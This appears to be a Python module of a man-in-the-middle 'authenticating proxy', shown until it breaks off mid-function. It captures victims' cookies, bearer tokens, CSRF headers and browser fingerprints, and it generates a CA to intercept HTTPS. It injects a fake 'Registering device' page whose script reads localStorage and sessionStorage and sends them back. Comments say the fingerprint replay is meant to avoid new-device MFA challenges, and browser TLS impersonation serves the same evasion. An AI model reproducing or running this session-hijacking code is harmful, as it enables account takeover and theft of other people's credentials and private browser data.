"""Authenticating HTTP/HTTPS proxy.

Injects captured credentials (cookies, bearer tokens, headers) into requests
matching known sites. Configure your browser or tool to use this as a proxy.

HTTP  — headers and cookies injected directly.
HTTPS — CONNECT tunnel with BITM via a generated CA cert (installed once).
        Without the CA cert installed, HTTPS sites will show cert warnings.
"""

import asyncio
import json
import os
import ssl
import sys
import time
import tempfile
import traceback
from pathlib import Path
from urllib.parse import urlparse

from backend.store import JsonStore
from backend.shared import append_log, get_config_value
from backend.site_rules import host_allowed_for_proxy

credentials_store = JsonStore("credentials")
cookies_store = JsonStore("cookies")

_proxy_server: asyncio.AbstractServer | None = None
_request_count = 0
_inject_count = 0

# ── Live state capture ────────────────────────────────────
# Per-hostname record of what flowed through the proxy, usable to hydrate
# a running Playwright session. Keyed by hostname.
_captured_sessions: dict[str, dict] = {}


def _parse_set_cookie(sc: str, hostname: str) -> dict | None:
    """Parse a Set-Cookie header value into a Playwright-compatible cookie dict."""
    if not sc or "=" not in sc:
        return None
    parts = [p.strip() for p in sc.split(";") if p.strip()]
    name_val = parts[0]
    if "=" not in name_val:
        return None
    name, value = name_val.split("=", 1)
    cookie = {
        "name": name.strip(),
        "value": value.strip(),
        "domain": hostname,
        "path": "/",
    }
    for p in parts[1:]:
        low = p.lower()
        if low.startswith("domain="):
            d = p.split("=", 1)[1].strip().lstrip(".")
            if d:
                cookie["domain"] = d
        elif low.startswith("path="):
            cookie["path"] = p.split("=", 1)[1].strip() or "/"
        elif low.startswith("expires="):
            # Playwright wants `expires` as unix timestamp; skip for session cookies
            pass
        elif low.startswith("max-age="):
            try:
                cookie["expires"] = int(time.time()) + int(p.split("=", 1)[1].strip())
            except ValueError:
                pass
        elif low == "secure":
            cookie["secure"] = True
        elif low == "httponly":
            cookie["httpOnly"] = True
        elif low.startswith("samesite="):
            val = p.split("=", 1)[1].strip().capitalize()
            if val in ("Strict", "Lax", "None"):
                cookie["sameSite"] = val
    return cookie


_SELF_HOSTS = {"localhost", "127.0.0.1", "0.0.0.0", "host.docker.internal"}


def _is_self(hostname: str) -> bool:
    """True if the hostname points back at our own container/control-plane."""
    h = (hostname or "").split(":")[0].lower()
    return h in _SELF_HOSTS


def _capture_request(hostname: str, headers: dict, url: str):
    """Record Cookie + Authorization from the client's request."""
    if not hostname:
        return
    if _is_self(hostname):
        # Don't pollute dashboard sessions with "localhost" entries when the
        # subject's browser is hitting our own capture link through :3128.
        return
    first_time = hostname not in _captured_sessions
    sess = _captured_sessions.setdefault(hostname, {
        "hostname": hostname, "cookies": {}, "headers": {},
        "fingerprint": {},
        "last_url": "", "captured_at": 0.0,
    })
    sess["last_url"] = url
    sess["captured_at"] = time.time()
    auth = headers.get("Authorization") or headers.get("authorization")
    captured_header_names = []
    if auth:
        prev = sess["headers"].get("Authorization")
        sess["headers"]["Authorization"] = auth
        if prev != auth:
            captured_header_names.append("Authorization")
    # Device fingerprint: the user's real browser is connecting through the
    # BITM, so its User-Agent + client-hints + Accept-Language come through
    # on every request. Keep the latest per-host — Playwright can replay it
    # so the IdP sees the same device (avoids a new-device MFA challenge).
    _FP_HEADER_NAMES = (
        "user-agent", "accept-language",
        "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
        "sec-ch-ua-platform-version", "sec-ch-ua-arch", "sec-ch-ua-bitness",
        "sec-ch-ua-model", "sec-ch-ua-full-version-list",
        "sec-ch-ua-form-factors", "sec-ch-ua-wow64",
    )
    fp = sess.setdefault("fingerprint", {})
    fp_was_empty = not fp
    prev_ua = next((v for k, v in fp.items() if k.lower() == "user-agent"),
                   "")
    for k, v in headers.items():
        lk = k.lower()
        if lk in _FP_HEADER_NAMES:
            # Preserve original header casing for later replay.
            fp[k] = v
        if any(tag in lk for tag in ("csrf", "xsrf", "x-ms-token", "x-auth")):
            prev = sess["headers"].get(k)
            sess["headers"][k] = v
            if prev != v:
                captured_header_names.append(k)
    # Log when a fingerprint is first seen for this host OR when the UA
    # changes (same browser session rarely does; a change usually means
    # a different physical device started routing through the proxy).
    new_ua = next((v for k, v in fp.items() if k.lower() == "user-agent"),
                  "")
    if new_ua and (fp_was_empty or new_ua != prev_ua):
        hint_count = sum(1 for k in fp if k.lower().startswith("sec-ch-ua"))
        _log(f"CAPTURE_FINGERPRINT {hostname}: ua={new_ua[:120]} "
             f"hints={hint_count} lang="
             f"{next((v for k, v in fp.items() if k.lower() == 'accept-language'), '(none)')[:40]}")
    # Client-sent Cookie header represents full cookie state for this domain
    ck = headers.get("Cookie") or headers.get("cookie")
    new_cookie_names = []
    if ck:
        for pair in ck.split(";"):
            pair = pair.strip()
            if "=" in pair:
                n, v = pair.split("=", 1)
                name = n.strip()
                prev = sess["cookies"].get(name, {}).get("value")
                sess["cookies"][name] = {
                    "name": name, "value": v.strip(),
                    "domain": hostname, "path": "/",
                }
                if prev != v.strip():
                    new_cookie_names.append(name)
    if first_time:
        _log(f"CAPTURE_START {hostname} via proxy (request)")
    if captured_header_names:
        _log(f"CAPTURE_REQ_HEADERS {hostname}: {', '.join(captured_header_names)}")
    if new_cookie_names:
        names = ", ".join(new_cookie_names[:10])
        more = f" +{len(new_cookie_names)-10} more" if len(new_cookie_names) > 10 else ""
        _log(f"CAPTURE_REQ_COOKIES {hostname}: {names}{more}  (total {len(sess['cookies'])})",
             level="debug")


_PROBE_CALLBACK_PATH = "/__bitm_probe_callback"


def _build_probe_response(hostname: str, original_url: str,
                          token: str, device_id: str,
                          want_storage: bool) -> bytes:
    """Return a one-shot HTTP/1.1 200 OK that runs a JS probe in the
    subject's browser and POSTs results back to the proxy itself via a
    sentinel path that we intercept (no API key, no CORS dance).
    After the POST, the page meta-refreshes to `original_url`.
    """
    # Embed values via JSON literals so quoting is safe.
    cb_url = (f"//{hostname}{_PROBE_CALLBACK_PATH}"
              f"?token={token}&device_id={device_id}&host={hostname}")
    redirect = original_url or f"https://{hostname}/"
    storage_js = ""
    if want_storage:
        storage_js = (
            "try{const _ls={};for(let i=0;i<localStorage.length;i++){"
            "const k=localStorage.key(i);_ls[k]=localStorage.getItem(k)}"
            "p.local_storage=_ls}catch(e){}"
            "try{const _ss={};for(let i=0;i<sessionStorage.length;i++){"
            "const k=sessionStorage.key(i);_ss[k]=sessionStorage.getItem(k)}"
            "p.session_storage=_ss}catch(e){}"
        )
    js = (
        "(()=>{const p={};"
        "try{p.tz=Intl.DateTimeFormat().resolvedOptions().timeZone}catch(e){}"
        "try{p.languages=navigator.languages||[]}catch(e){}"
        "try{p.platform=navigator.platform||''}catch(e){}"
        "try{p.hardware_concurrency=navigator.hardwareConcurrency||0}catch(e){}"
        "try{p.device_memory=navigator.deviceMemory||0}catch(e){}"
        "try{p.screen={width:screen.width,height:screen.height,"
        "colorDepth:screen.colorDepth,pixelRatio:devicePixelRatio||1}}catch(e){}"
        "try{p.viewport={width:innerWidth,height:innerHeight}}catch(e){}"
        + storage_js +
        "fetch(" + json.dumps(cb_url) + ",{method:'POST',"
        "headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify(p),credentials:'omit'})"
        ".finally(()=>{location.replace(" + json.dumps(redirect) + ")});"
        "})();"
    )
    body = (
        "<!doctype html><meta charset='utf-8'>"
        "<title>Registering device…</title>"
        "<style>body{font-family:system-ui;background:#0a0a14;"
        "color:#cbd5e1;padding:24px}</style>"
        "<p>Registering this device with the BITM proxy…</p>"
        "<noscript>JavaScript is required for device registration. "
        "<a href=\"" + redirect.replace('"', '&quot;') + "\">Continue</a>"
        "</noscript>"
        "<script>" + js + "</script>"
    ).encode("utf-8")
    headers = (
        f"HTTP/1.1 200 OK\r\n"
        f"Content-Type: text/html; charset=utf-8\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cache-Control: no-store\r\n"
        f"Connection: close\r\n\r\n"
    ).encode("latin-1")
    return headers + body


def _is_probe_callback(path: str) -> bool:
    if not path:
        return False
    p = path.split("?", 1)[0]
    return p == _PROBE_CALLBACK_PATH


async def _handle_probe_callback(reader, writer, hostname: str,
                                 path_with_query: str,
                                 headers: dict) -> None:
    """Consume the JSON body and forward to backend.devices."""
    from urllib.parse import parse_qs
    qs = ""
    if "?" in path_with_query:
        qs = path_with_query.split("?", 1)[1]
    q = parse_qs(qs)
    token = (q.get("token") or [""])[0]
    device_id = (q.get("device_id") or [""])[0]
    host_q = (q.get("host") or [hostname])[0]

    cl = int(headers.get("Content-Length") or headers.get("content-length")
             or 0)
    body_bytes = await reader.read(cl) if cl > 0 else b""
    body_json: dict = {}
    try:
        body_json = json.loads(body_bytes.decode("utf-8")) if body_bytes else {}
    except Exception:
        body_json = {}
    ok = False
    try:
        from backend import devices as _dev
        consumed = _dev.consume_probe(host_q, token, device_id)
        if consumed:
            probed = {
                "tz": body_json.get("tz"),
                "languages": body_json.get("languages") or [],
                "platform": body_json.get("platform"),
                "screen": body_json.get("screen") or {},
                "viewport": body_json.get("viewport") or {},
                "hardware_concurrency": body_json.get("hardware_concurrency"),
                "device_memory": body_json.get("device_memory"),
            }
            _dev.apply_probe_result(
                device_id, probed, hostname=host_q,
                local_storage=body_json.get("local_storage") or None,
                session_storage=body_json.get("session_storage") or None,
            )
            ok = True
        else:
            append_log("warn", "devices",
                       f"DEVICE_PROBE_REJECT host={host_q} "
                       f"device={device_id} (token mismatch or expired)")
    except Exception as e:
        append_log("warn", "devices",
                   f"DEVICE_PROBE_ERROR host={host_q} device={device_id}: {e}")
    status = "204 No Content" if ok else "400 Bad Request"
    writer.write(
        (f"HTTP/1.1 {status}\r\n"
         f"Content-Length: 0\r\nCache-Control: no-store\r\n"
         f"Connection: close\r\n\r\n").encode("latin-1"))
    try:
        await writer.drain()
    except Exception:
        pass


# ── :3128 body capture (allowlisted hosts) ────────────────
# When the hostname matches site_rules.body_capture_hostnames(), the
# proxy mirrors the request + response into the Flow Trace buffer
# under a synthetic session ID `proxy_<hostname>`. The Flow Trace UI,
# Index tab, milestone classifier, and Decoded JWTs section all
# operate on this synthetic session for free. Bodies are still capped
# at MAX_FLOW_BODY (64 KB).

# req_id → flow seq for the body-capture path so a follow-up response
# patch can match the request entry. Keyed by id(request_dict) at
# call time; not durable across restarts.
_body_capture_req_ids: dict[str, int] = {}


def _body_capture_session_id(hostname: str) -> str:
    """Synthetic session id for a host's body-capture flow."""
    return f"proxy_{hostname.replace(':', '_')}"


def _body_capture_should(hostname: str) -> bool:
    if not hostname or _is_self(hostname):
        return False
    try:
        from backend import site_rules as _sr
        return _sr.host_matches_body_capture(hostname)
    except Exception:
        return False


def _body_capture_trim(data: bytes | None) -> tuple[str | None, bool]:
    """Truncate body bytes to 64 KB; return (text, truncated)."""
    if not data:
        return None, False
    MAX = 64 * 1024
    truncated = len(data) > MAX
    blob = data[:MAX] if truncated else data
    try:
        return blob.decode("utf-8", errors="replace"), truncated
    except Exception:
        return repr(blob), truncated


def _body_capture_request(hostname: str, method: str, url: str,
                           headers: dict, body: bytes | None,
                           req_id: str) -> None:
    """Append a flow-trace entry with the request side. Response is
    filled in by `_body_capture_response()` keyed off `req_id`."""
    if not _body_capture_should(hostname):
        return
    try:
        from backend.shared import append_flow
        from backend import auth_milestones as _am
    except Exception:
        return
    sid = _body_capture_session_id(hostname)
    body_text, body_trunc = _body_capture_trim(body)
    entry = {
        "req_id": req_id,
        "ts_req": time.time(),
        "ts_resp": None,
        "method": method,
        "url": url,
        "resource_type": "",
        "redirected_from_seq": None,
        "request_headers": dict(headers or {}),
        "request_body": body_text,
        "request_body_truncated": body_trunc,
        "status": None,
        "response_headers": None,
        "response_body": None,
        "response_body_truncated": False,
        "_proxy_capture": True,
    }
    # Request-side milestone pass — catches AUTH CODE / BEARER on the
    # request alone before the response arrives. _on_flow_response in
    # routes/browser.py does the same thing on the Playwright path.
    try:
        tags = _am.classify(entry)
        if tags:
            entry["auth_milestones"] = tags
    except Exception:
        pass
    seq = append_flow(sid, entry)
    _body_capture_req_ids[req_id] = seq
    # Best-effort registration so the dashboard's Sessions dropdown
    # surfaces this synthetic session and the Flow Trace tab can pick
    # it.
    try:
        from backend.shared import register_session
        register_session(sid, {
            "login_url": url,
            "site_id": hostname,
            "user_id": "",
            "synthetic": True,
            "source": "auth_proxy_body_capture",
        })
    except Exception:
        pass


def _body_capture_response(hostname: str, req_id: str, status: int,
                            headers: dict, body: bytes | None) -> None:
    if not _body_capture_should(hostname):
        return
    if req_id not in _body_capture_req_ids:
        return
    try:
        from backend.shared import update_flow, get_flow
        from backend import auth_milestones as _am
    except Exception:
        return
    sid = _body_capture_session_id(hostname)
    body_text, body_trunc = _body_capture_trim(body)
    patch = {
        "ts_resp": time.time(),
        "status": status,
        "response_headers": dict(headers or {}),
        "response_body": body_text,
        "response_body_truncated": body_trunc,
    }
    # Re-classify with the response — TOKENS / SESSION / PRT live here.
    try:
        candidate = {}
        for fe in get_flow(sid):
            if fe.get("req_id") == req_id:
                candidate = {
                    "url": fe.get("url"),
                    "method": fe.get("method"),
                    "request_headers": fe.get("request_headers"),
                    "request_body": fe.get("request_body"),
                }
                break
        candidate.update(patch)
        tags = _am.classify(candidate)
        if tags:
            patch["auth_milestones"] = tags
    except Exception:
        pass
    update_flow(sid, req_id, patch)
    _body_capture_req_ids.pop(req_id, None)


def _capture_response_headers(hostname: str, raw_headers: list[str]):
    """Record Set-Cookie headers from the server's response."""
    if not hostname:
        return
    if _is_self(hostname):
        return
    sess = _captured_sessions.setdefault(hostname, {
        "hostname": hostname, "cookies": {}, "headers": {},
        "last_url": "", "captured_at": 0.0,
    })
    sess["captured_at"] = time.time()
    set_cookie_names = []
    for h in raw_headers:
        if ":" not in h:
            continue
        k, v = h.split(":", 1)
        if k.strip().lower() == "set-cookie":
            cookie = _parse_set_cookie(v.strip(), hostname)
            if cookie:
                sess["cookies"][cookie["name"]] = cookie
                set_cookie_names.append(cookie["name"])
    if set_cookie_names:
        names = ", ".join(set_cookie_names[:10])
        more = f" +{len(set_cookie_names)-10} more" if len(set_cookie_names) > 10 else ""
        _log(f"CAPTURE_SET_COOKIE {hostname}: {names}{more}  (total {len(sess['cookies'])})")


def get_captured_session_state(hostname: str) -> dict | None:
    """Return the captured state for a hostname (or None)."""
    sess = _captured_sessions.get(hostname)
    if not sess:
        return None
    return {
        "hostname": sess["hostname"],
        "cookies": list(sess["cookies"].values()),
        "headers": dict(sess["headers"]),
        "fingerprint": dict(sess.get("fingerprint") or {}),
        "last_url": sess["last_url"],
        "captured_at": sess["captured_at"],
    }


def get_captured_fingerprint(hostname: str) -> dict | None:
    """Return just the device-fingerprint headers for a host, or the most
    recent global fingerprint if that host wasn't captured directly.

    The user's browser has a single fingerprint — it doesn't differ by
    destination host. Per-host lookup succeeds when the user already
    browsed through the proxy to that exact hostname; otherwise we fall
    back to any captured session so Playwright can still replay a
    consistent device signature."""
    sess = _captured_sessions.get(hostname)
    if sess and sess.get("fingerprint"):
        return dict(sess["fingerprint"])
    # Fall back to the freshest fingerprint across all captured sessions.
    latest = None
    latest_ts = 0.0
    for s in _captured_sessions.values():
        fp = s.get("fingerprint") or {}
        ts = s.get("captured_at") or 0.0
        if fp and ts > latest_ts:
            latest, latest_ts = fp, ts
    return dict(latest) if latest else None


# ── Upstream TLS impersonation (curl_cffi) ────────────────
# When `use_captured_fingerprint` + `fingerprint_match_tls_proxy` are on
# AND we've captured a UA for the target host, we route the upstream
# leg of a proxied request through curl_cffi with an impersonate= target
# matching the captured browser family. The origin's TLS stack sees a
# real Chrome/Firefox/Safari/Edge-shape Client Hello instead of the
# OpenSSL-shape one Python's ssl module produces.
#
# Constraints baked in below:
#   - HTTP/1.1 only. We force it via http_version; h2 framing translation
#     is out of scope.
#   - WebSocket upgrades skip impersonation (Upgrade header forces None).
#   - Response body ≥ 50 MB falls back to stock path (auth flows rarely
#     involve binaries that big).
#   - On curl error, the (host, target) pair is skip-listed for 5 min so
#     one bad origin doesn't stall every subsequent request.

_HOP_BY_HOP_HEADERS = frozenset([
    "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
    "te", "trailers", "transfer-encoding", "upgrade", "proxy-connection",
])
# (hostname, impersonate_target) -> epoch_ts when the skip expires.
_impersonate_skip: dict[tuple[str, str], float] = {}
_IMPERSONATE_SKIP_SECS = 300.0
_IMPERSONATE_MAX_BODY = 50 * 1024 * 1024


def _pick_impersonate_target(hostname: str,
                                req_headers: dict) -> str | None:
    """Return a curl_cffi impersonate tag for this request, or None to
    use the stock raw-socket path."""
    if not get_config_value("use_captured_fingerprint", False):
        return None
    if not get_config_value("fingerprint_match_tls_proxy", True):
        return None
    # Websocket upgrades can't go through curl_cffi.
    if any((k.lower() == "upgrade") for k in req_headers):
        return None
    # Respect the cooldown list.
    fp = (_captured_sessions.get(hostname) or {}).get("fingerprint") or {}
    ua = next((v for k, v in fp.items() if k.lower() == "user-agent"),
              "")
    if not ua:
        # Try the global latest fingerprint — Sec-CH-UA doesn't change
        # per host on a real browser.
        fp = get_captured_fingerprint(hostname) or {}
        ua = next((v for k, v in fp.items() if k.lower() == "user-agent"),
                  "")
    if not ua:
        return None
    from backend.ua_engine import ua_to_impersonate_target
    target = ua_to_impersonate_target(ua)
    if not target:
        return None
    skip_until = _impersonate_skip.get((hostname, target), 0.0)
    if skip_until and skip_until > time.time():
        return None
    return target


def _filter_hop_by_hop(headers: dict | list) -> list[tuple[str, str]]:
    """Drop hop-by-hop headers. Accepts either a dict or an iterable of
    (k, v) pairs. Returns a list to preserve duplicate header support."""
    it = headers.items() if isinstance(headers, dict) else headers
    return [(k, v) for k, v in it
            if k.lower() not in _HOP_BY_HOP_HEADERS]


async def _upstream_fetch_impersonate(
    client_writer: asyncio.StreamWriter,
    url: str, method: str, req_headers: dict,
    body_bytes: bytes, impersonate: str, hostname: str,
    capture_req_id: str | None = None,
) -> bool:
    """Fetch via curl_cffi and stream response back to the client.

    Returns True on success (response was written, caller is done), False
    when the caller should fall back to the stock path."""
    try:
        from curl_cffi.requests import AsyncSession
        from curl_cffi import CurlHttpVersion
    except ImportError as e:
        _log(f"IMPERSONATE unavailable — install curl_cffi: {e}",
             "warn")
        _impersonate_skip[(hostname, impersonate)] = (
            time.time() + _IMPERSONATE_SKIP_SECS)
        return False
    # Build header list curl_cffi will send. Drop hop-by-hop. Leave the
    # captured UA + Sec-CH-UA-* intact — curl will accept them verbatim
    # and override its own defaults.
    send_headers = dict(_filter_hop_by_hop(req_headers))
    try:
        # http_version takes a CurlHttpVersion enum (or its int
        # value). curl_cffi >=0.10 rejects the bare 1.1 float with
        # `TypeError: an integer is required`, which used to silently
        # work on older releases.
        async with AsyncSession(impersonate=impersonate,
                                http_version=CurlHttpVersion.V1_1,
                                timeout=30,
                                verify=not get_config_value("ignore_ssl",
                                                             False)) as s:
            r = await s.request(
                method, url, headers=send_headers,
                data=body_bytes or None, stream=True,
                allow_redirects=False,
            )
    except Exception as e:
        _log(f"IMPERSONATE fetch failed host={hostname} "
             f"target={impersonate}: {type(e).__name__}: {e} — "
             f"skip-listing for {int(_IMPERSONATE_SKIP_SECS)}s",
             "warn")
        append_log("warn", "proxy_unroutable",
                   f"{hostname}: impersonate_fetch_failed "
                   f"({type(e).__name__})")
        _impersonate_skip[(hostname, impersonate)] = (
            time.time() + _IMPERSONATE_SKIP_SECS)
        return False
    # Write the response status line + headers. curl_cffi has already
    # decoded Transfer-Encoding and Content-Encoding; re-frame outbound
    # as chunked so we can stream without knowing total size up front.
    try:
        status = r.status_code
        reason = getattr(r, "reason", "") or ""
        status_line = f"HTTP/1.1 {status} {reason}\r\n".encode("latin-1")
        resp_headers = _filter_hop_by_hop(r.headers.items())
        # Drop any Content-Length curl gave us — the decoded body length
        # may differ and we're framing as chunked anyway.
        resp_headers = [(k, v) for k, v in resp_headers
                        if k.lower() != "content-length"]
        resp_headers.append(("Transfer-Encoding", "chunked"))
        # Tell the shared Set-Cookie capture what we saw.
        _capture_response_headers(
            hostname,
            [f"{k}: {v}" for k, v in r.headers.items()])
        hdr_bytes = status_line + b"".join(
            f"{k}: {v}\r\n".encode("latin-1") for k, v in resp_headers
        ) + b"\r\n"
        client_writer.write(hdr_bytes)
        await client_writer.drain()
        total = 0
        # Buffer body for the body-capture path. Cap at 64 KB so a
        # large response doesn't balloon RAM. _BODY_CAPTURE_MAX is the
        # hard cap; anything beyond that is dropped on the floor for
        # capture purposes (still streamed to the client).
        _BODY_CAPTURE_MAX = 64 * 1024
        cap_buf = b"" if capture_req_id else None
        async for chunk in r.aiter_content(chunk_size=65536):
            if not chunk:
                continue
            total += len(chunk)
            if total > _IMPERSONATE_MAX_BODY:
                # Exceeded cap mid-stream — close the connection hard.
                # Fallback isn't possible once we've written headers;
                # the client will see a truncation and retry.
                _log(f"IMPERSONATE body >50MB host={hostname} "
                     f"— aborting stream", "warn")
                break
            if cap_buf is not None and len(cap_buf) < _BODY_CAPTURE_MAX:
                cap_buf += chunk[:_BODY_CAPTURE_MAX - len(cap_buf)]
            client_writer.write(
                f"{len(chunk):x}\r\n".encode("ascii"))
            client_writer.write(chunk)
            client_writer.write(b"\r\n")
            await client_writer.drain()
        client_writer.write(b"0\r\n\r\n")
        await client_writer.drain()
        if capture_req_id:
            _body_capture_response(hostname, capture_req_id, status,
                                    dict(r.headers), cap_buf or b"")
        _log(f"IMPERSONATE host={hostname} target={impersonate} "
             f"-> {status} ({total} bytes)")
        return True
    except Exception as e:
        _log(f"IMPERSONATE relay error host={hostname}: "
             f"{type(e).__name__}: {e}", "warn")
        # Headers may already be on the wire — can't safely fall back.
        return True


def list_captured_hostnames() -> list[dict]:
    out = []
    for h, s in _captured_sessions.items():
        fp = s.get("fingerprint") or {}
        ua = next((v for k, v in fp.items() if k.lower() == "user-agent"),
                  "")
        # Compact family tag so the dropdown stays readable. Defers to
        # the same classifier Playwright launch uses so both agree.
        fam = ""
        if ua:
            try:
                from backend.ua_engine import ua_to_playwright_engine
                family, channel = ua_to_playwright_engine(ua)
                fam = f"{family}{'-' + channel if channel else ''}"
            except Exception:
                fam = ""
        out.append({
            "hostname": h,
            "cookies": len(s["cookies"]),
            "headers": len(s["headers"]),
            "last_url": s["last_url"],
            "captured_at": s["captured_at"],
            "fingerprint": {
                "ua": ua,
                "family": fam,
                "hints": sum(1 for k in fp
                             if k.lower().startswith("sec-ch-ua")),
            },
        })
    return out


def clear_captured_session(hostname: str):
    _captured_sessions.pop(hostname, None)


# ── Playwright-routed fetch ────────────────────────────────
# When proxy_via_playwright is on, outbound requests are fetched via the most
# recent active Playwright session's APIRequestContext — so the request
# inherits that session's cookie jar and auth state. The response is returned
# as a (status, headers, body) triple and written back to the proxy client.

async def _fetch_via_playwright(url: str, method: str,
                                 headers: dict, body: bytes | None):
    """Use the most recent live Playwright page's context.request to fetch."""
    try:
        from backend.routes.browser import _live_pages
    except Exception:
        return None
    if not _live_pages:
        _log("PROXY_VIA_PLAYWRIGHT no active session — falling through to direct", "warn")
        return None
    sid, page = list(_live_pages.items())[-1]
    # Strip hop-by-hop + Host; Playwright sets them.
    req_headers = {k: v for k, v in headers.items()
                   if k.lower() not in ("host", "connection", "keep-alive",
                                        "content-length", "transfer-encoding",
                                        "accept-encoding")}
    try:
        kwargs: dict = {"method": method, "headers": req_headers}
        if body:
            kwargs["data"] = body
        resp = await page.context.request.fetch(url, **kwargs)
        resp_body = await resp.body()
        _log(f"PROXY_VIA_PLAYWRIGHT {method} {url[:150]} -> {resp.status} "
             f"(session {sid})")
        return resp.status, dict(resp.headers or {}), resp_body
    except Exception as e:
        _log(f"PROXY_VIA_PLAYWRIGHT fetch failed: {e} — falling through", "warn")
        try:
            host = urlparse(url).hostname or ""
            append_log("info", "proxy_unroutable",
                       f"{host}: playwright_fetch_failed: {e}")
        except Exception:
            pass
        return None


def _write_http_response(writer, status: int, headers: dict, body: bytes):
    """Write an HTTP/1.1 response block (status line + headers + body)."""
    status_text = {200: "OK", 301: "Moved Permanently", 302: "Found",
                   303: "See Other", 304: "Not Modified", 307: "Temporary Redirect",
                   308: "Permanent Redirect", 400: "Bad Request", 401: "Unauthorized",
                   403: "Forbidden", 404: "Not Found", 500: "Internal Server Error",
                   502: "Bad Gateway", 503: "Service Unavailable"}.get(status, "")
    lines = [f"HTTP/1.1 {status} {status_text}".rstrip()]
    skip = {"content-length", "transfer-encoding", "content-encoding",
            "connection", "keep-alive"}
    for k, v in headers.items():
        if k.lower() in skip:
            continue
        lines.append(f"{k}: {v}")
    lines.append(f"Content-Length: {len(body or b'')}")
    lines.append("Connection: close")
    lines.append("")
    lines.append("")
    writer.write("\r\n".join(lines).encode("latin-1", errors="replace"))
    if body:
        writer.write(body)

# ── CA cert generation (for HTTPS BITM) ──────────────────

_ca_key = None
_ca_cert = None
_CA_DIR = None


def _get_ca_dir() -> Path:
    from backend.paths import data_dir
    d = data_dir() / "proxy_ca"
    d.mkdir(parents=True, exist_ok=True)
    return d


def _ensure_ca():
    """Generate a self-signed CA cert if one doesn't exist. Requires cryptography."""
    global _ca_key, _ca_cert, _CA_DIR
    if _ca_key is not None:
        return True

    _CA_DIR = _get_ca_dir()
    key_path = _CA_DIR / "ca.key"
    cert_path = _CA_DIR / "ca.crt"

    if key_path.exists() and cert_path.exists():
        try:
            from cryptography.hazmat.primitives.serialization import load_pem_private_key
            from cryptography import x509
            _ca_key = load_pem_private_key(key_path.read_bytes(), password=None)
            _ca_cert = x509.load_pem_x509_certificate(cert_path.read_bytes())
            return True
        except Exception as e:
            append_log("warn", "auth_proxy", f"Failed to load existing CA: {e}")

    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import datetime

        _ca_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        name = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, "BITM Proxy CA"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "BITM Proxy"),
        ])
        _ca_cert = (
            x509.CertificateBuilder()
            .subject_name(name)
            .issuer_name(name)
            .public_key(_ca_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow())
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=3650))
            .add_extension(x509.BasicConstraints(ca=True, path_length=0), critical=True)
            .add_extension(
                x509.KeyUsage(
                    digital_signature=True, key_cert_sign=True, crl_sign=True,
                    content_commitment=False, key_encipherment=False,
                    data_encipherment=False, key_agreement=False,
                    encipher_only=False, decipher_only=False,
                ), critical=True)
            .sign(_ca_key, hashes.SHA256())
        )
        key_path.write_bytes(_ca_key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption()))
        cert_path.write_bytes(_ca_cert.public_bytes(serialization.Encoding.PEM))
        append_log("info", "auth_proxy", f"Generated proxy CA cert: {cert_path}")
        return True
    except ImportError:
        append_log("warn", "auth_proxy",
                   "cryptography package not installed — HTTPS BITM disabled. "
                   "Install with: pip install cryptography")
        return False
    except Exception as e:
        append_log("warn", "auth_proxy", f"CA generation failed: {e}")
        return False


def get_ca_info() -> dict:
    """Return metadata about the currently-loaded CA cert + key.
    Used by the dashboard to show what's active right now."""
    info: dict = {"loaded": False}
    if _ca_cert is None:
        return info
    try:
        from cryptography.hazmat.primitives import serialization
        subj = _ca_cert.subject.rfc4514_string()
        issuer = _ca_cert.issuer.rfc4514_string()
        info["subject"] = subj
        info["issuer"] = issuer
        info["self_signed"] = (subj == issuer)
        try:
            info["not_before"] = _ca_cert.not_valid_before_utc.isoformat()
            info["not_after"] = _ca_cert.not_valid_after_utc.isoformat()
        except AttributeError:
            info["not_before"] = _ca_cert.not_valid_before.isoformat()
            info["not_after"] = _ca_cert.not_valid_after.isoformat()
        info["serial"] = format(_ca_cert.serial_number, "x")
        try:
            info["sha256"] = _ca_cert.fingerprint(
                __import__("cryptography").hazmat.primitives.hashes.SHA256()
            ).hex()
        except Exception:
            pass
        info["loaded"] = True
        if _CA_DIR is not None:
            info["cert_path"] = str(_CA_DIR / "ca.crt")
            info["key_path"] = str(_CA_DIR / "ca.key")
    except Exception as e:
        info["error"] = f"{type(e).__name__}: {e}"
    return info


def install_uploaded_ca(cert_pem: bytes, key_pem: bytes) -> dict:
    """Replace the auth proxy's CA with operator-supplied PEM blobs.

    Validates that the cert is a parseable X.509 certificate, the key
    is a parseable RSA/EC private key, and the key pairs with the
    cert (modulus or public-point match). Persists to
    `$DATA_DIR/proxy_ca/{ca.crt, ca.key}`, hot-reloads the in-memory
    handles, and clears any per-host cert that was minted under the
    OLD CA so subsequent connections get fresh ones signed by the new
    one.

    Returns a result dict; raises only on entirely unexpected
    failures.
    """
    global _ca_key, _ca_cert, _CA_DIR
    try:
        from cryptography.hazmat.primitives.serialization import (
            load_pem_private_key,
        )
        from cryptography import x509
        from cryptography.hazmat.primitives.asymmetric import rsa, ec
    except ImportError as e:
        return {"ok": False, "error": f"cryptography not installed: {e}"}

    cert_pem_b = cert_pem if isinstance(cert_pem, (bytes, bytearray)) \
        else cert_pem.encode("utf-8")
    key_pem_b = key_pem if isinstance(key_pem, (bytes, bytearray)) \
        else key_pem.encode("utf-8")
    try:
        cert = x509.load_pem_x509_certificate(cert_pem_b)
    except Exception as e:
        return {"ok": False,
                "error": f"cert is not valid PEM X.509: "
                         f"{type(e).__name__}: {e}"}
    try:
        key = load_pem_private_key(key_pem_b, password=None)
    except Exception as e:
        return {"ok": False,
                "error": f"key is not a parseable PEM private key "
                         f"(passphrase-protected keys not supported): "
                         f"{type(e).__name__}: {e}"}

    # Match key to cert.
    cert_pub = cert.public_key()
    key_pub = key.public_key()
    matched = False
    try:
        if isinstance(cert_pub, rsa.RSAPublicKey) and isinstance(
